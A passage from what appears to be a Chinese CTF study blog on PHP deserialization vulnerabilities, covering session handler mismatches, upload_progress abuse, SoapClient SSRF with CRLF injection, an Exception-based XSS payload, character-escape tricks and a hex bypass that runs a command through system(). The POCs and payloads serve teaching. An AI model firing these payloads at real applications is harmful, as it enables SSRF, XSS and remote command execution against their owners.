class="hljs-string">&quot;:0:&#123;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-string">&quot;a:1:&#123;s:5:&quot;</span><span class="hljs-variable">hello</span><span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  object(stdClass)#1 (0) &#123;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>这是因为当使用php引擎的时候，php引擎会以<code>|</code>作为作为key和value的分隔符，那么就会将<code>a:1:&#123;s:5:&quot;hello&quot;;s:20:&quot;</code>作为SESSION的key，将<code>O:8:&quot;stdClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到stdClass这个类。</p><p>实际利用的话一般分为两种：</p><ul><li><strong>session.auto_start=On</strong></li></ul><p>当配置选项 session.auto_start＝On，会自动注册 Session 会话（相当于执行了<code>session_start()</code>），因为该过程是发生在<strong>脚本代码执行前</strong>，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的。因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话。然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//foo1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;session.auto_start&#x27;</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">session_destroy</span>();<br>&#125;<br> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;test&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>访问<code>http://172.31.171.100/tmp/foo1.php?test=|O:8:%22stdClass%22:0:&#123;&#125;</code></p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513214442.png" alt="image-20210513214442376"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// foo2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513214755.png" alt="image-20210513214755128"></p><blockquote><p>php.ini配置中session_use_trans_sid = 1才能跨页面访问SESSION</p></blockquote><ul><li><strong>session.auto_start=Off</strong></li></ul><p>当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// foo1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br> <br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;test&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br> <span class="hljs-comment">// foo2.php</span><br><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">session_start</span>();<br> <br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br>      <span class="hljs-keyword">var</span> <span class="hljs-variable">$hi</span>;<br> <br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hi,&#x27;</span>;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hi;<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问连接：<code>http://172.31.171.100/tmp/foo1.php?test=|O:4:&quot;test&quot;:1:&#123;s:2:&quot;hi&quot;;s:4:John&quot;;&#125;</code></p><p>再访问<code>foo2.php</code>就会发生反序列化漏洞</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513230623.png" alt="image-20210513230623054"></p><h3 id="session-upload-progress">session.upload_progress</h3><p>当 <code>session.upload_progress.enabled</code> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是 <code>session.upload_progress.prefix</code> 与<code>session.upload_progress.name</code>连接在一起的值。并且当文件上传完成的时候，这个session会被立即删除。</p><p>也就是说，我们通过构造一个上传文件的表单，将其中一个参数的名字设置为<code>session.upload_progress.name</code>的值（这个值能在phpinfo看到），PHP检测到这种POST请求的时候就会往<code>$_SESSION</code>里面填入这个参数的值，从而能够用来设置session。然后通过条件竞争来读取session文件的内容。</p><p>example：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;form action<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method<span class="hljs-operator">=</span><span class="hljs-string">&quot;POST&quot;</span> enctype<span class="hljs-operator">=</span><span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;       <br>    &lt;input type<span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;123&quot;</span> /&gt;        <br>    &lt;input type<span class="hljs-operator">=</span><span class="hljs-string">&quot;file&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;file&quot;</span> /&gt;        <br>    &lt;input type<span class="hljs-operator">=</span><span class="hljs-string">&quot;submit&quot;</span> /&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>这里的<code>session.upload_progress.name</code>的值为<code>PHP_SESSION_UPLOAD_PROGRESS</code>，这样就把123写入了session里面。当PHP环境存在session反序列化漏洞，但是又没有直接控制session值的方法时，可以利用这个方法。</p><h2 id="原生类反序列化利用">原生类反序列化利用</h2><h3 id="SoapClient">SoapClient</h3><blockquote><p>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p></blockquote><p>php中的<code>SoapClient</code>类可以创建soap数据报文，与wsdl接口进行交互。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">public SoapClient::SoapClient ( mixed $wsdl [,<span class="hljs-built_in"> array </span>$options ] )<br></code></pre></td></tr></table></figure><p>第一个参数用来指明是否是wsdl模式。</p><p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</p><p>其中<code>$options</code>数组下有个<code>user_agent</code>选项，我们可以利用该选项来自定义<code>User-Agent</code>。而在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。</p><p><strong>还有一点就是<code>SoapClient</code>类的<code>__call</code>魔法方法，当调用这个方法时能够对内网进行访问，构成SSRF攻击。</strong></p><p>POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://123.206.216.198/bbb.php&#x27;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;a=b&amp;flag=aaa&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: xxxx=1234&#x27;</span><br>    );<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>.(<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>      =&gt; <span class="hljs-string">&quot;aaab&quot;</span>));<br> <br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&#x27;%0d%0a&#x27;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;%26&#x27;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$aaa</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Error-Exception">Error/Exception</h3><p>Error类就是php的一个内置类用于自动自定义一个<code>Error</code>，在php7的环境下可能会造成一个<code>xss</code>漏洞，因为它内置有一个<code>toString</code>的方法。</p><p>Exception类跟Error类原理一样，但是也适用于PHP5</p><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>得到编码后的反序列化结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Exception%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A25%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ealert%<span class="hljs-number">281</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A17%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A27%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fvar%<span class="hljs-number">2</span>Fwww%<span class="hljs-number">2</span>Fhtml%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Fadmin.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A16%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A19%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D <br></code></pre></td></tr></table></figure><p>效果：</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210514172736.png" alt="image-20210514172735929"></p><h2 id="反序列化字符逃逸">反序列化字符逃逸</h2><p>PHP在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾(字符串除外)，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。</p><p>字符逃逸的本质其实也是闭合，但是它分为两种情况，一是字符变多，二是字符变少。</p><h3 id="字符增多">字符增多</h3><p>字符增多就是后端对我们输入的序列化后的字符进行替换称为长度更长的字符</p><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/p/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;WW&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$age</span> = <span class="hljs-string">&#x27;24&#x27;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$age</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br><span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$r</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$r</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里通过<code>filter()</code>函数对我们输入的内容进行检查，将字符<code>p</code>替换成<code>ww</code>，再进行反序列化。</p><p>正常情况下，我们输入的内容没有字符<code>p</code>的时候并不会出现问题：</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210518202551.png" alt="image-20210518202551751"></p><p>当输入的内容存在<code>p</code>字符的时候，由于过滤之后的字符数变多了，并不复合序列化的规则，所以进行反序列化的时候会报错。</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210518202524.png" alt="image-20210518202524197"></p><p>如果我们年龄修改为其他，比如18，那么可以通过构造username的值来使得age的值改变</p><ul><li>首先是构造age值得序列化后的字符<code>&quot;;i:1;s:2:&quot;18&quot;;&#125;</code>，前面的<code>&quot;</code>是为了闭合前一个元素username的值，最后的<code>&#125;</code>是为了闭合这一个数组，抛弃后面的内容。</li><li>然后数上面构造的这一串有多少个字符，这里有16个字符，因此需要通过<code>filter()</code>函数之后变多16个字符，使得我们构造的这一部分内容能够逃出username的范围，称为独立的一个元素。由于这里一个字符<code>p</code>会变成2个<code>w</code>字符，因此每一个<code>p</code>就会多出一个字符，所以这里需要16个字符<code>p</code>。</li></ul><p>payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?username=pppppppppppppppp<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">18</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210518203627.png" alt="image-20210518203627470"></p><h3 id="字符减少">字符减少</h3><p>字符减少就是后端对我们输入的序列化后的字符进行替换称为长度更短的字符</p><p>example：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xquery">&lt;?php<br><span class="hljs-keyword">function</span><span class="hljs-built_in"> filter</span>(<span class="hljs-variable">$string</span>)&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/xx/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br>class<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$age</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$age</span>);<br>var_dump(serialize(<span class="hljs-variable">$user</span>));<br>echo <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br><span class="hljs-variable">$r</span> =<span class="hljs-built_in"> filter</span>(serialize(<span class="hljs-variable">$user</span>));<br>var_dump(<span class="hljs-variable">$r</span>);<br>var_dump(unserialize(<span class="hljs-variable">$r</span>));<br>?&gt;<br></code></pre></td></tr></table></figure><p>还是上面的例子，其中这里的<code>$age</code>可控，但是是将输入的字符串中的<code>xx</code>替换为<code>s</code>，如果我们这里想插入一个新的参数，比如想在第二个参数插入<code>hello</code>，那么我能可以尝试让前一个参数进行字符减少，把后面的参数的key作为前一个参数的值吞掉，把后一个参数的value作为新的键值对变成新的变量</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210520210651.png" alt="image-20210520210651576"></p><h2 id="绕过">绕过</h2><h3 id="利用-16-进制绕过过滤">利用 16 进制绕过过滤</h3><p>将示意字符串的<code>s</code>改为大写<code>S</code>时，其值会解析 16 进制数据<br>例如：<code>O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code><br>可改为：<code>O:4:&quot;Test&quot;:1:&#123;S:3:&quot;\63md&quot;;S:6:&quot;\77hoami&quot;;&#125;</code></p><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>)!==False)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;想换我CMD，没这个可能！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$test_n</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$test</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当传入<code>O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>时，可以发现无法绕过过滤函数</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210518162452.png" alt="image-20210518162452782"></p><p>修改为大写<code>S</code>时，可以看到成功</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210518162427.png" alt="image-20210518162427036"></p><h2 id="参考资料">参考资料</h2><p><a href="https://www.cnblogs.com/wjrblogs/p/12800358.html">PHP 反序列化漏洞入门学习笔记</a></p><p><a href="https://ca01h.top/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87/">PHP反序列化漏洞学习——基础篇</a></p><p><a href="https://ca01h.top/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化学习——Phar反序列化</a></p><p><a href="https://ca01h.top/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化漏洞学习——Session反序列化</a></p><p><a href="https://ca01h.top/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">从两道CTF题目学习PHP原生类反序列化利用</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCTF_2018_admin</title>
    <link href="/2022/10/23/%5BHCTF-2018%5Dadmin/"/>
    <url>/2022/10/23/%5BHCTF-2018%5Dadmin/</url>
    
